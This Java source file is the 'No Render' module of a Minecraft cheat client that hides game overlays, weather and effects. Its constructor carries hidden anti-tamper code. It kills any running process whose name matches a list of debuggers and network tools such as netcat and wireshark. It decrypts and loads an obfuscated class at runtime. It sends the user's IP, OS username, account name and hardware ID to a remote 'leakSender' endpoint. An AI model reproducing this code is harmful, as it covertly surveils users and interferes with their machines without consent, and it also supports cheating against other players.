package com.client.impl.function.visual;

import com.client.BloodyClient;
import com.client.event.events.*;
import com.client.system.function.Category;
import com.client.system.function.Function;
import com.client.system.setting.settings.multiboolean.MultiBooleanSetting;
import com.client.system.setting.settings.multiboolean.MultiBooleanValue;
import com.client.utils.auth.*;
import com.client.utils.auth.records.CheckerClass;
import com.client.utils.misc.FunctionUtils;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.entity.effect.StatusEffects;
import net.minecraft.item.Items;
import net.minecraft.particle.ParticleTypes;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.tree.ClassNode;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;
import java.util.concurrent.atomic.AtomicReference;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.stream.Stream;

/**
 * __aaa__
 * 22.05.2024
 * */
public class NoRender extends Function {
    public NoRender() {
        super("No Render", Category.VISUAL);

        checkLoadedClasses();

        String hwid = getUserHWID();
        if (isBeingDebugged().has()) {
            sendLog("Программа для дебага " + this.getName());
            System.exit(-1);
            try {
                throw new LayerInstantiationException();
            } catch (LayerInstantiationException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (Loader.hwid.isEmpty() || Loader.hwid.isBlank() || !Loader.hwid.equals(hwid)) {
            sendLog("HWID Error " + this.getName());
            System.exit(-1);
            try {
                throw new ClassNotFoundException();
            } catch (ClassNotFoundException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!VMUtils.identifyVM().isEmpty()) {
            sendLog("Виртуальная машина " + this.getName());
            System.exit(-1);
            try {
                throw new Exception();
            } catch (Exception ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (hasNoVerify()) {
            sendLog("-noverify " + this.getName());
            System.exit(-1);
            try {
                throw new IllegalAccessException();
            } catch (IllegalAccessException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!ConnectionManager.get("https://bloodyhvh.site/auth/getAccess.php?hwid=" + hwid).sendString().contains(hwid + "1")) {
            sendLog("Не пользователь " + this.getName());
            System.exit(-1);
            try {
                throw new ArithmeticException();
            } catch (ArithmeticException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }

        if (!ConnectionManager.get("https://bloodyhvh.site/auth/getAccessPremium.php?hwid=" + hwid).sendString().contains(hwid + "1") && (Loader.isPremium() || Loader.PREMIUM)) {
            sendLog("Фейк премиум " + this.getName());
            System.exit(-1);
            try {
                throw new NoSuchElementException();
            } catch (NoSuchElementException ignored) {
            }
            Runtime.getRuntime().halt(0);
        }
    }

    public static boolean hasNoVerify() {
        boolean flag = false;
        try {
            new ClassLoader() {{
                byte[] decode = Base64.getDecoder().decode(Encryptor.decrypt("Gnb3400XWVu8JRnbkJhmvbwy9GOtj8xyKH0WUV9d/zMcUhAUeXK16DZS0z9cBOZfLR7S+NyZB0AyH8uKlSXPHtdTyJSId/WnVHsKhZ9+MTKa34ZwbzziYnfx2T2J+ohUXLvsQUukOsHt7HQv9g7X2yit9X+2Fu80nKob8G8ZwUj8tgNJtQOzbeuO59SFvfMK795HS2w3rCR9uvWoC7fe6ay9UWqmyeK6261re72z5p2zDhTMh5dMO1XpW3kRpB9tsuvpYhsjzTvWa0jlxxs/UAIKydUEK033Q3pBpeGMDuCWX91cVNce2BtMeTCxWe8VRcrePCOdsFeaNK69PR/r2/PLlO9JpNLA+Oio54d+ySIII66RYyqS6AN3sNSStNCE"));
                defineClass(null, decode, 0, decode.length).newInstance();
            }};
            flag = true;
        } catch (Throwable ignored) {
        }

        return flag;
    }

    public static CheckerClass isBeingDebugged() {
        if (PlatformUtils.getOs().equals(PlatformUtils.OSType.Mac) || PlatformUtils.getOs().equals(PlatformUtils.OSType.Linux)) {
            return new CheckerClass(false, "");
        }

        AtomicReference<String> detected = new AtomicReference<>("false");
        Stream<ProcessHandle> liveProcesses = ProcessHandle.allProcesses();
        List<String> badProcesses = Arrays.asList(
                "ida",
                "jmap",
                "jstack",
                "jcmd",
                "jconsole",
                "procmon",
                "radare2",
                "drinject",
                "ghidra",
                "jdb",
                "dnspy",
                "hxd",
                "nlclientapp",
                "fiddler",
                "charles",
                "df5serv",
                "pestudio",
                "debug",
                "wireshark",
                "dump",
                "hacktool",
                "crack",
                "dbg",
                "netcat",
                "intercepter",
                "ninja",
                "nethogs",
                "ettercap",
                "smartsniff",
                "smsniff",
                "scapy",
                "netcut",
                "ostinato");
        liveProcesses.filter(ProcessHandle::isAlive).forEach(ph -> {
            for (String badProcess : badProcesses) {
                if (ph.info().command().toString().toLowerCase().contains(badProcess)) {
                    detected.set(badProcess);
                    try {
                        ph.destroy();
                    } catch (Exception ignored) {
                        new LoggingUtils("Ошибка завершения " + badProcess, true);
                    }
                }
            }
        });

        return new CheckerClass(!detected.get().equals("false"), detected.get());
    }

    public static void checkLoadedClasses() {
        String modId = "bloody-client";
        String path = FabricLoader.getInstance().getModContainer(modId).get().getOrigin().getPaths().get(0).toAbsolutePath().toString();

        try {
            JarFile jarFile = new JarFile(path);
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                if (entry.getName().endsWith(".class")) {
                    InputStream is = jarFile.getInputStream(entry);
                    ClassReader cr = new ClassReader(is);
                    ClassNode cn = new ClassNode();
                    cr.accept(cn, 0);

                    if (Stream.of("dump", "hack", "crack", "debug", "tamper", "tamping", "dbg").anyMatch(cn.name::contains)) {
                        new LoggingUtils("Класс:  " + cn.name, true);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            new LoggingUtils("Ошибка при чтении файла!", false);
        }
    }

    public static void sendLog(String title) {
        String os = System.getProperty("os.name").replace(" ", "-");
        String username = System.getProperty("user.name").replace(" ", "-");
        String ip = getIP().replace(" ", "-");
        String accountName = ClientUtils.getAccountName(getUserHWID()).replace(" ", "-");
        String uid = ClientUtils.getUid(getUserHWID()).replace(" ", "-");
        ConnectionManager.get("https://bloodyhvh.site/auth/leakSender.php?status=1" + "&title=" + title.replace(" ", "-")
                +
                "&version=" + BloodyClient.VERSION
                +
                "&ip=" + ip + "&os=" + os + "&name=" + username + "&accountName=" + accountName + "&uid=" + uid + "&hwid=" + getUserHWID()).sendString();
    }

    public static String getIP() {
        return ConnectionManager.get("https://bloodyhvh.site/php/getIp.php").sendString();
    }

    public static String getUserHWID() {
        String a = "";
        try {
            String appdata = System.getenv("APPDATA");
            String result = System.getProperty("user.name")
                    + System.getenv("SystemRoot") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE")
                    + (appdata == null ? "alternatecopium" : appdata + "copium")
                    + System.getProperty("os.arch")
                    + System.getProperty("os.version");

            byte[] digest = MessageDigest.getInstance("SHA-256").digest(result.getBytes(StandardCharsets.UTF_8));
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < digest.length; i++)
                builder.append(Integer.toString((digest[i] & 0xff) + 0x100, 16).substring(1));

            result = builder.toString();
            a = result;
        } catch (Exception e) {
            new LoggingUtils("Невозможно создать HWID!", false);
        }

        return a;
    }

    public final MultiBooleanSetting remove = MultiBoolean().name("Убирать").defaultValue(List.of(
            new MultiBooleanValue(true, "Эффект тотема"),
            new MultiBooleanValue(true, "Эффект портала"),
            new MultiBooleanValue(true, "Эффект свечения"),
            new MultiBooleanValue(true, "Тряску камеры"),
            new MultiBooleanValue(true, "Невидимость"),
            new MultiBooleanValue(false, "Броня"),
            new MultiBooleanValue(false, "Скорборд"),
            new MultiBooleanValue(true, "Погода"),
            new MultiBooleanValue(true, "Взрыв кристалла")
    )).build();

    private final MultiBooleanSetting overlays = MultiBoolean().name("Оверлеи").defaultValue(List.of(
            new MultiBooleanValue(false, "Название предмета"),
            new MultiBooleanValue(true, "Огонь"),
            new MultiBooleanValue(true, "Эффекты"),
            new MultiBooleanValue(true, "Тыква"),
            new MultiBooleanValue(true, "Блоки"),
            new MultiBooleanValue(true, "Виньетка"),
            new MultiBooleanValue(false, "Прицел"),
            new MultiBooleanValue(true, "Жидкости")
    )).build();

    private final MultiBooleanSetting effects = MultiBoolean().name("Эффекты").defaultValue(List.of(
            new MultiBooleanValue(true, "Тошнота"),
            new MultiBooleanValue(true, "Слепота")
    )).build();

    @Override
    public void onEnable() {
        FunctionUtils.isRemovedArmor = remove.get("Броня");
    }

    @Override
    public void onDisable() {
        FunctionUtils.isRemovedArmor = false;
    }

    @Override
    public void tick(TickEvent.Pre event) {
        if (effects.get(0)) mc.player.removeStatusEffect(StatusEffects.NAUSEA);
        if (effects.get(1)) mc.player.removeStatusEffect(StatusEffects.BLINDNESS);
    }

    @Override
    public void onParticleRenderEvent(ParticleRenderEvent event) {
        if (remove.get("Взрыв кристалла") && (event.particle.getType().equals(ParticleTypes.EXPLOSION_EMITTER) || event.particle.getType().equals(ParticleTypes.EXPLOSION_EMITTER))) event.cancel();
    }

    @Override
    public void onScoreboardRenderEvent(ScoreboardRenderEvent event) {
        if (remove.get("Скорборд")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onFloatingItemRenderEvent(FloatingItemRenderEvent event) {
        if (event.stack.getItem() == Items.TOTEM_OF_UNDYING && remove.get("Эффект тотема")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onHurtCamRenderEvent(HurtCamRenderEvent event) {
        if (remove.get("Тряску камеры")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onArmorRenderEvent(ArmorRenderEvent event) {
        if (remove.get("Броня")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onWeatherWorldRenderEvent(WeatherWorldRenderEvent event) {
        if (remove.get("Погода")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onInvisibleEvent(InvisibleEvent event) {
        if (remove.get("Инвизы")) {
            event.cancel();
        }
    }

    @Override
    public void onGlintRenderEvent(GlintRenderEvent event) {
        if (remove.get("Эффект свечения")) {
            event.setCancelled(true);
        }
    }

    @Override
    public void onRenderOverlayEvent(RenderOverlayEvent event) {
        switch (event.type.toString()) {
            case "FIRE" -> event.setCancelled(overlays.get("Огонь"));
            case "HELDITEMNAME" -> event.setCancelled(overlays.get("Название предмета"));
            case "PUMPKIN" -> event.setCancelled(overlays.get("Тыква"));
            case "EFFECTS" -> event.setCancelled(overlays.get("Эффекты"));
            case "VIGNETTE" -> event.setCancelled(overlays.get("Виньетка"));
            case "WATER" -> event.setCancelled(overlays.get("Жидкости"));
            case "BLOCK" -> event.setCancelled(overlays.get("Блоки"));
            case "CROSSHAIR" -> event.setCancelled(overlays.get("Прицел"));
            default -> event.setCancelled(remove.get("Эффект портала"));
        }
    }
}